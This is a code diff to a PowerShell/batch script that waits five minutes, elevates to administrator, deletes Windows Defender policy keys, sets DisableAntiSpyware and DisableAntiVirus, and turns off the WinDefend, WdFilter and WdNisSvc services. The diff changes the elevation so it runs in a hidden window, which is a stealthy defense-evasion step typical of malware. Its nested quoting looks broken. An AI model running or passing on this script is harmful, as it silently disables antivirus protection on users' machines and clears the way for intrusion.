@@ -1,7 +1,6 @@
 Start-Sleep -s 300
-$Programm = "cmd.exe -verb runAs
-@echo off
-reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
+Start-Process -FilePath "powershell" -Verb
+RunAs -ArgumentList "cmd.exe -verb runAs -ArgumentList "reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
@@ -37,6 +36,5 @@ reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWOR
 reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
 reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
 reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
-cls
-Start-Process -FilePath "powershell" -Verb
-RunAs -ArgumentList "$Programm"
+cls" 
+" -WindowStyle hidden
